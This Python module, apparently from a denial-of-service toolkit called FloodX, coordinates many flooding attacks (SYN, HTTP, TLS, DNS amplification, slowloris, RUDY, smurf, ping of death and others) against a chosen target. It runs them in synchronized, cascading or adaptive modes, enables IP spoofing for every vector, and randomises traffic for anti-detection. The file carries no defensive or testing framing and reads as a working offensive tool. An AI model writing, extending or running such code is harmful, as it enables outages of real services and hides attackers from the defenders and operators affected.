"""
FloodX: Multi-Vector Attack Coordinator
Intelligent multi-vector attack system that simultaneously executes multiple attack types
with adaptive coordination, intelligent timing, and cross-vector synchronization.
"""

import asyncio
import random
import time
import threading
from typing import Dict, Any, List, Optional, Set, Tuple
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
from dataclasses import dataclass
import json

from common.logger import logger, stats_logger
from common.colors import success_text, warning_text, error_text, info_text, accent_text
from orchestrator.dispatcher import AttackDispatcher
from orchestrator.continuous_engine import ContinuousAttackEngine


@dataclass
class VectorProfile:
    """Profile for individual attack vector configuration."""
    name: str
    weight: float  # Relative importance (0.1 to 1.0)
    intensity: float  # Attack intensity multiplier (0.1 to 3.0)
    duration_ratio: float  # Fraction of total duration (0.1 to 1.0)
    delay_offset: float  # Start delay in seconds
    continuous: bool  # Whether this vector runs continuously
    dependencies: List[str]  # Other vectors this depends on
    conflicts: List[str]  # Vectors that conflict with this one


class MultiVectorCoordinator:
    """
    Advanced multi-vector attack coordinator with intelligent orchestration.
    
    Features:
    - Simultaneous execution of multiple attack vectors
    - Intelligent vector scheduling and synchronization
    - Adaptive resource allocation based on target response
    - Cross-vector communication and coordination
    - Dynamic vector addition/removal during execution
    - Performance optimization through vector balancing
    - Anti-detection through vector rotation and morphing
    """
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.port = config['port']
        self.duration = config.get('duration', 300)  # 5 minutes default
        self.total_concurrency = config.get('concurrency', 2000)
        
        # Multi-vector configuration
        self.enabled_vectors = config.get('vectors', ['syn', 'http', 'tls', 'dns'])
        self.coordination_mode = config.get('coordination_mode', 'adaptive')  # adaptive, synchronized, cascade
        self.vector_rotation = config.get('vector_rotation', True)
        self.dynamic_adjustment = config.get('dynamic_adjustment', True)
        
        # Initialize components
        self.dispatcher = AttackDispatcher()
        self.vector_profiles = self._create_vector_profiles()
        self.active_vectors = {}
        self.vector_stats = {}
        self.coordination_stats = {
            'vectors_launched': 0,
            'vectors_completed': 0,
            'synchronization_events': 0,
            'adaptations_made': 0,
            'peak_concurrent_vectors': 0
        }
        
        # Execution control
        self.running = False
        self.start_time = None
        self.coordinator_tasks = []
        self.vector_tasks = {}
        
        # Performance monitoring
        self.performance_monitor = None
        self.stats_lock = threading.Lock()
        
        # Resource allocation
        self.resource_allocator = ResourceAllocator(self.total_concurrency)
        
        logger.info(f"🎯 {success_text('Multi-Vector Coordinator initialized')}")
        logger.info(f"   Target: {accent_text(self.target)}:{accent_text(str(self.port))}")
        logger.info(f"   Vectors: {accent_text(str(len(self.enabled_vectors)))}")
        logger.info(f"   Mode: {accent_text(self.coordination_mode)}")
        logger.info(f"   Total Concurrency: {accent_text(str(self.total_concurrency))}")
    
    def _create_vector_profiles(self) -> Dict[str, VectorProfile]:
        """Create optimized profiles for each attack vector."""
        profiles = {
            'syn': VectorProfile(
                name='syn', weight=1.0, intensity=1.0, duration_ratio=1.0,
                delay_offset=0, continuous=True, dependencies=[], conflicts=[]
            ),
            'http': VectorProfile(
                name='http', weight=0.8, intensity=0.7, duration_ratio=0.9,
                delay_offset=5, continuous=True, dependencies=[], conflicts=[]
            ),
            'tls': VectorProfile(
                name='tls', weight=0.9, intensity=1.2, duration_ratio=0.8,
                delay_offset=10, continuous=True, dependencies=[], conflicts=[]
            ),
            'dns': VectorProfile(
                name='dns', weight=0.7, intensity=0.6, duration_ratio=1.0,
                delay_offset=2, continuous=True, dependencies=[], conflicts=[]
            ),
            'udp': VectorProfile(
                name='udp', weight=0.6, intensity=0.8, duration_ratio=0.7,
                delay_offset=8, continuous=True, dependencies=[], conflicts=[]
            ),
            'icmp': VectorProfile(
                name='icmp', weight=0.5, intensity=0.5, duration_ratio=0.6,
                delay_offset=15, continuous=False, dependencies=[], conflicts=['ping_of_death']
            ),
            'websocket': VectorProfile(
                name='websocket', weight=0.7, intensity=0.9, duration_ratio=0.8,
                delay_offset=20, continuous=True, dependencies=['http'], conflicts=[]
            ),
            'slowloris': VectorProfile(
                name='slowloris', weight=0.8, intensity=1.1, duration_ratio=1.0,
                delay_offset=25, continuous=True, dependencies=[], conflicts=['http']
            ),
            'dns_amplification': VectorProfile(
                name='dns_amplification', weight=1.0, intensity=1.5, duration_ratio=0.9,
                delay_offset=12, continuous=True, dependencies=[], conflicts=[]
            ),
            'smtp': VectorProfile(
                name='smtp', weight=0.6, intensity=0.7, duration_ratio=0.7,
                delay_offset=18, continuous=True, dependencies=[], conflicts=[]
            ),
            'teardrop': VectorProfile(
                name='teardrop', weight=0.4, intensity=0.6, duration_ratio=0.5,
                delay_offset=30, continuous=False, dependencies=[], conflicts=[]
            ),
            'smurf': VectorProfile(
                name='smurf', weight=0.3, intensity=0.4, duration_ratio=0.4,
                delay_offset=35, continuous=False, dependencies=[], conflicts=[]
            ),
            'ping_of_death': VectorProfile(
                name='ping_of_death', weight=0.3, intensity=0.5, duration_ratio=0.3,
                delay_offset=40, continuous=False, dependencies=[], conflicts=['icmp']
            ),
            'rudy': VectorProfile(
                name='rudy', weight=0.5, intensity=0.8, duration_ratio=0.6,
                delay_offset=22, continuous=True, dependencies=[], conflicts=[]
            )
        }
        
        # Filter profiles to only enabled vectors
        return {name: profile for name, profile in profiles.items() if name in self.enabled_vectors}
    
    async def execute_multi_vector_attack(self):
        """Main multi-vector attack execution with intelligent coordination."""
        logger.info(f"🚀 {success_text('Starting multi-vector coordinated attack')}")
        
        self.running = True
        self.start_time = time.time()
        
        try:
            # Start performance monitoring
            self.performance_monitor = asyncio.create_task(self._performance_monitor())
            
            # Execute based on coordination mode
            if self.coordination_mode == 'synchronized':
                await self._execute_synchronized_attack()
            elif self.coordination_mode == 'cascade':
                await self._execute_cascade_attack()
            else:  # adaptive
                await self._execute_adaptive_attack()
                
        except KeyboardInterrupt:
            logger.info(f"🛑 {warning_text('Multi-vector attack interrupted by user')}")
        except Exception as e:
            logger.error(f"❌ {error_text(f'Multi-vector attack error: {e}')}")
        finally:
            await self.cleanup()
    
    async def _execute_synchronized_attack(self):
        """Execute all vectors simultaneously with synchronized timing."""
        logger.info(f"🔄 {info_text('Executing synchronized multi-vector attack')}")
        
        # Allocate resources to each vector
        vector_allocations = self.resource_allocator.allocate_resources(self.vector_profiles)
        
        # Launch all vectors simultaneously
        for vector_name, profile in self.vector_profiles.items():
            allocation = vector_allocations[vector_name]
            
            # Create vector configuration
            vector_config = self._create_vector_config(vector_name, profile, allocation)
            
            # Launch vector with delay offset
            task = asyncio.create_task(
                self._launch_vector_with_delay(vector_name, vector_config, profile.delay_offset)
            )
            self.vector_tasks[vector_name] = task
            self.coordination_stats['vectors_launched'] += 1
        
        # Wait for all vectors to complete or duration to expire
        await self._wait_for_completion()
    
    async def _execute_cascade_attack(self):
        """Execute vectors in cascading sequence for maximum impact."""
        logger.info(f"🌊 {info_text('Executing cascade multi-vector attack')}")
        
        # Sort vectors by priority (weight + intensity)
        sorted_vectors = sorted(
            self.vector_profiles.items(),
            key=lambda x: x[1].weight * x[1].intensity,
            reverse=True
        )
        
        cascade_delay = 15  # seconds between cascade launches
        
        for i, (vector_name, profile) in enumerate(sorted_vectors):
            if not self.running:
                break
            
            # Allocate resources for this vector
            remaining_vectors = len(sorted_vectors) - i
            vector_concurrency = max(50, self.total_concurrency // remaining_vectors)
            
            allocation = ResourceAllocation(
                concurrency=vector_concurrency,
                priority=1.0 - (i * 0.1),  # Decreasing priority
                resource_share=1.0 / remaining_vectors
            )
            
            # Create and launch vector
            vector_config = self._create_vector_config(vector_name, profile, allocation)
            
            logger.info(f"🌊 Launching cascade vector {i+1}/{len(sorted_vectors)}: {accent_text(vector_name)}")
            
            task = asyncio.create_task(self._launch_vector(vector_name, vector_config))
            self.vector_tasks[vector_name] = task
            self.coordination_stats['vectors_launched'] += 1
            
            # Wait before launching next vector
            if i < len(sorted_vectors) - 1:  # Don't wait after the last vector
                await asyncio.sleep(cascade_delay)
        
        # Wait for all vectors to complete
        await self._wait_for_completion()
    
    async def _execute_adaptive_attack(self):
        """Execute adaptive attack with dynamic vector management."""
        logger.info(f"🧠 {info_text('Executing adaptive multi-vector attack')}")
        
        # Start with high-priority vectors
        priority_vectors = ['syn', 'tls', 'dns_amplification', 'http']
        initial_vectors = [v for v in priority_vectors if v in self.vector_profiles]
        
        # Launch initial vectors
        await self._launch_initial_vectors(initial_vectors)
        
        # Adaptive management loop
        management_interval = 30  # seconds
        
        while self.running and (time.time() - self.start_time) < self.duration:
            await asyncio.sleep(management_interval)
            
            # Analyze current performance
            performance_metrics = await self._analyze_performance()
            
            # Make adaptive decisions
            await self._make_adaptive_decisions(performance_metrics)
            
            # Update coordination stats
            self.coordination_stats['adaptations_made'] += 1
    
    async def _launch_initial_vectors(self, vector_names: List[str]):
        """Launch initial set of vectors for adaptive attack."""
        # Allocate resources among initial vectors
        initial_profiles = {name: self.vector_profiles[name] for name in vector_names}
        allocations = self.resource_allocator.allocate_resources(initial_profiles)
        
        # Launch each vector
        for vector_name in vector_names:
            profile = self.vector_profiles[vector_name]
            allocation = allocations[vector_name]
            
            vector_config = self._create_vector_config(vector_name, profile, allocation)
            
            task = asyncio.create_task(
                self._launch_vector_with_delay(vector_name, vector_config, profile.delay_offset)
            )
            self.vector_tasks[vector_name] = task
            self.coordination_stats['vectors_launched'] += 1
    
    async def _analyze_performance(self) -> Dict[str, Any]:
        """Analyze current attack performance for adaptive decisions."""
        metrics = {
            'active_vectors': len([t for t in self.vector_tasks.values() if not t.done()]),
            'total_packets_sent': 0,
            'average_success_rate': 0.0,
            'target_response_time': 0.0,
            'resource_utilization': 0.0,
            'vector_performance': {}
        }
        
        # Collect vector-specific metrics
        for vector_name, stats in self.vector_stats.items():
            if stats:
                metrics['total_packets_sent'] += stats.get('packets_sent', 0)
                metrics['vector_performance'][vector_name] = {
                    'success_rate': stats.get('success_rate', 0.0),
                    'packets_per_second': stats.get('packets_per_second', 0.0),
                    'errors': stats.get('errors', 0)
                }
        
        # Calculate averages
        if self.vector_stats:
            success_rates = [
                stats.get('success_rate', 0.0) 
                for stats in self.vector_stats.values() 
                if stats
            ]
            if success_rates:
                metrics['average_success_rate'] = sum(success_rates) / len(success_rates)
        
        return metrics
    
    async def _make_adaptive_decisions(self, metrics: Dict[str, Any]):
        """Make adaptive decisions based on performance metrics."""
        logger.debug(f"🧠 Making adaptive decisions based on performance metrics")
        
        # Decision 1: Launch additional vectors if performance is good
        if (metrics['average_success_rate'] > 0.8 and 
            metrics['active_vectors'] < len(self.vector_profiles)):
            await self._launch_additional_vectors()
        
        # Decision 2: Stop underperforming vectors
        for vector_name, perf in metrics['vector_performance'].items():
            if perf['success_rate'] < 0.3 and vector_name in self.vector_tasks:
                logger.info(f"🛑 Stopping underperforming vector: {accent_text(vector_name)}")
                await self._stop_vector(vector_name)
        
        # Decision 3: Boost high-performing vectors
        best_vector = max(
            metrics['vector_performance'].items(),
            key=lambda x: x[1]['success_rate'] * x[1]['packets_per_second'],
            default=(None, None)
        )
        
        if best_vector[0] and best_vector[1]['success_rate'] > 0.9:
            logger.info(f"🚀 Boosting high-performing vector: {accent_text(best_vector[0])}")
            await self._boost_vector(best_vector[0])
    
    async def _launch_additional_vectors(self):
        """Launch additional vectors that aren't currently running."""
        inactive_vectors = [
            name for name in self.vector_profiles.keys()
            if name not in self.vector_tasks or self.vector_tasks[name].done()
        ]
        
        if not inactive_vectors:
            return
        
        # Select 1-2 random inactive vectors to launch
        vectors_to_launch = random.sample(
            inactive_vectors, 
            min(2, len(inactive_vectors))
        )
        
        for vector_name in vectors_to_launch:
            profile = self.vector_profiles[vector_name]
            
            # Allocate remaining resources
            remaining_concurrency = max(50, self.total_concurrency // (len(self.vector_tasks) + 1))
            allocation = ResourceAllocation(
                concurrency=remaining_concurrency,
                priority=0.5,  # Medium priority for additional vectors
                resource_share=0.1
            )
            
            vector_config = self._create_vector_config(vector_name, profile, allocation)
            
            logger.info(f"➕ Launching additional vector: {accent_text(vector_name)}")
            
            task = asyncio.create_task(self._launch_vector(vector_name, vector_config))
            self.vector_tasks[vector_name] = task
            self.coordination_stats['vectors_launched'] += 1
    
    async def _stop_vector(self, vector_name: str):
        """Stop a specific vector."""
        if vector_name in self.vector_tasks:
            task = self.vector_tasks[vector_name]
            if not task.done():
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
            del self.vector_tasks[vector_name]
    
    async def _boost_vector(self, vector_name: str):
        """Boost the performance of a specific vector."""
        # This is a placeholder for vector boosting logic
        # In a real implementation, this might increase the vector's resource allocation
        logger.debug(f"🚀 Boosting vector {vector_name} (placeholder implementation)")
    
    def _create_vector_config(self, vector_name: str, profile: VectorProfile, allocation) -> Dict[str, Any]:
        """Create configuration for a specific vector."""
        base_config = self.config.copy()
        base_config.update({
            'vector': vector_name,
            'concurrency': allocation.concurrency,
            'duration': int(self.duration * profile.duration_ratio),
            'advanced': True,
            'continuous': profile.continuous,
            'spoof_ip': True,  # Enable IP spoofing for all vectors
            'randomization_level': 'high'
        })
        
        # Vector-specific adjustments
        if vector_name in ['http', 'websocket', 'slowloris']:
            base_config['user_agent_rotation'] = True
            base_config['header_randomization'] = True
        
        if vector_name in ['syn', 'udp', 'icmp']:
            base_config['packet_size_variation'] = True
            base_config['timing_randomization'] = True
        
        return base_config
    
    async def _launch_vector_with_delay(self, vector_name: str, config: Dict[str, Any], delay: float):
        """Launch a vector with specified delay."""
        if delay > 0:
            logger.debug(f"⏰ Delaying {vector_name} launch by {delay}s")
            await asyncio.sleep(delay)
        
        return await self._launch_vector(vector_name, config)
    
    async def _launch_vector(self, vector_name: str, config: Dict[str, Any]):
        """Launch a single attack vector."""
        logger.info(f"🎯 Launching vector: {accent_text(vector_name)}")
        
        try:
            # Initialize vector stats
            self.vector_stats[vector_name] = {
                'start_time': time.time(),
                'packets_sent': 0,
                'errors': 0,
                'success_rate': 0.0,
                'packets_per_second': 0.0
            }
            
            # Use continuous engine for continuous vectors
            profile = self.vector_profiles[vector_name]
            if profile.continuous:
                # Launch with continuous engine
                continuous_config = config.copy()
                continuous_config['continuous'] = True
                continuous_config['restart_interval'] = 30
                
                engine = ContinuousAttackEngine(continuous_config)
                await engine.run()
            else:
                # Launch single-shot attack via dispatcher
                await self.dispatcher.dispatch(config)
            
            self.coordination_stats['vectors_completed'] += 1
            logger.info(f"✅ Vector completed: {accent_text(vector_name)}")
            
        except Exception as e:
            logger.error(f"❌ Vector {vector_name} failed: {e}")
            if vector_name in self.vector_stats:
                self.vector_stats[vector_name]['errors'] += 1
    
    async def _wait_for_completion(self):
        """Wait for all vectors to complete or duration to expire."""
        end_time = self.start_time + self.duration
        
        while self.running and time.time() < end_time:
            # Check if any vectors are still running
            active_tasks = [t for t in self.vector_tasks.values() if not t.done()]
            
            if not active_tasks:
                logger.info(f"✅ {success_text('All vectors completed')}")
                break
            
            # Update peak concurrent vectors
            current_active = len(active_tasks)
            if current_active > self.coordination_stats['peak_concurrent_vectors']:
                self.coordination_stats['peak_concurrent_vectors'] = current_active
            
            await asyncio.sleep(5)  # Check every 5 seconds
        
        # Cancel remaining tasks if duration expired
        for task in self.vector_tasks.values():
            if not task.done():
                task.cancel()
    
    async def _performance_monitor(self):
        """Monitor overall multi-vector attack performance."""
        while self.running:
            await asyncio.sleep(60)  # Report every minute
            
            uptime = time.time() - self.start_time if self.start_time else 0
            active_vectors = len([t for t in self.vector_tasks.values() if not t.done()])
            
            logger.info(f"📊 {info_text('Multi-Vector Performance:')}")
            logger.info(f"   Uptime: {accent_text(f'{uptime:.1f}s')}")
            logger.info(f"   Active Vectors: {accent_text(str(active_vectors))}")
            logger.info(f"   Launched/Completed: {accent_text(str(self.coordination_stats['vectors_launched']))}/{accent_text(str(self.coordination_stats['vectors_completed']))}")
            logger.info(f"   Peak Concurrent: {accent_text(str(self.coordination_stats['peak_concurrent_vectors']))}")
            logger.info(f"   Adaptations: {accent_text(str(self.coordination_stats['adaptations_made']))}")
    
    async def cleanup(self):
        """Clean up all vector tasks and resources."""
        logger.info(f"🧹 {info_text('Cleaning up multi-vector attack...')}")
        
        self.running = False
        
        # Cancel all vector tasks
        for vector_name, task in self.vector_tasks.items():
            if not task.done():
                logger.debug(f"Cancelling vector: {vector_name}")
                task.cancel()
        
        # Wait for cancellation
        if self.vector_tasks:
            await asyncio.gather(*self.vector_tasks.values(), return_exceptions=True)
        
        # Cancel performance monitor
        if self.performance_monitor and not self.performance_monitor.done():
            self.performance_monitor.cancel()
        
        # Final statistics
        uptime = time.time() - self.start_time if self.start_time else 0
        logger.info(f"✅ {success_text('Multi-vector attack completed:')}")
        logger.info(f"   Total Runtime: {accent_text(f'{uptime:.1f}s')}")
        logger.info(f"   Vectors Launched: {accent_text(str(self.coordination_stats['vectors_launched']))}")
        logger.info(f"   Vectors Completed: {accent_text(str(self.coordination_stats['vectors_completed']))}")
        logger.info(f"   Peak Concurrent Vectors: {accent_text(str(self.coordination_stats['peak_concurrent_vectors']))}")
    
    async def run(self):
        """Main entry point for multi-vector attack."""
        await self.execute_multi_vector_attack()


@dataclass
class ResourceAllocation:
    """Resource allocation for a specific vector."""
    concurrency: int
    priority: float
    resource_share: float


class ResourceAllocator:
    """Intelligent resource allocator for multi-vector attacks."""
    
    def __init__(self, total_concurrency: int):
        self.total_concurrency = total_concurrency
    
    def allocate_resources(self, profiles: Dict[str, VectorProfile]) -> Dict[str, ResourceAllocation]:
        """Allocate resources among vectors based on their profiles."""
        allocations = {}
        
        # Calculate total weight
        total_weight = sum(profile.weight * profile.intensity for profile in profiles.values())
        
        # Allocate resources proportionally
        for name, profile in profiles.items():
            vector_weight = profile.weight * profile.intensity
            weight_ratio = vector_weight / total_weight
            
            allocated_concurrency = max(10, int(self.total_concurrency * weight_ratio))
            
            allocations[name] = ResourceAllocation(
                concurrency=allocated_concurrency,
                priority=profile.weight,
                resource_share=weight_ratio
            )
        
        return allocations


# Alias for compatibility
MultiVectorAttack = MultiVectorCoordinator
